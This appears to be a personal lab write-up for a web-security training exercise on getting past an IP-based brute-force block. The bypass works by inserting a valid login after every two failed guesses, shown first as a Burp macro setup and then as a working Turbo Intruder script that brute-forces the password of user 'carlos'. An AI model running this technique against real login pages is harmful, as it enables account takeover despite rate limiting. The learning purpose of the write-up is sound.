Authentication is the process of verifying the identity of a user or client. Websites are potentially exposed to anyone who is connected to the internet. This makes robust authentication mechanisms integral to effective web security.
# Lab: Broken brute-force protection, IP block
## Macro 
So the lab let's you try wrong creds 3 times and blocks your IP for 1 min for the 4th time.
`Incorrect attempt` > `Incorrect attempt` >`Incorrect attempt` > **Block for 1 min**....

`Incorrect attempt` >`Incorrect attempt` > Correct attempt >`Incorrect attempt` >`Incorrect attempt`> Correct attempt >`Incorrect attempt` >`Incorrect attempt`

so with this technique, we can bypass the brute force protection.
Go to Proxy Setting-> Sessions -> Session Handling rules.
> **NOTE:** I've already added the rule in the image below
![[file-20250806194125516.png]]

After clicking on **Add**, select Run a Macro, and the **Add** the successful login attempt in the **Macro Recorder** which is `wiener:peter` 
![[file-20250806194309791.png]]
After clicking `OK`, now make sure the scope applies to all the tools and URLs
![[file-20250806194748989.png]]
Now in Intruder, give the correct username `carlos` along with random password.
Set payloads and resource pool to make sure only `one` request is sent.
![[file-20250806193814583.png]]
![[file-20250806193526816.png]]
## Turbo Intruder
```Python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.THREADED
                           )
    
    valid_username = "wiener"   
    valid_password = "peter"      
    target_username = "carlos"   
    
   
    passwords = ["123456", "password", <SNIP>, "matthew", "access", "yankees", "987654321"]
    
    failed_count = 0
    
    engine.queue(target.req, [valid_username, valid_password])
    
    for password in passwords:
        engine.queue(target.req, [target_username, password])
        failed_count += 1
        
        if failed_count == 2:
            engine.queue(target.req, [valid_username, valid_password])
            failed_count = 0

def handleResponse(req, interesting):
    table.add(req)
```
![[file-20250806204834277.png]]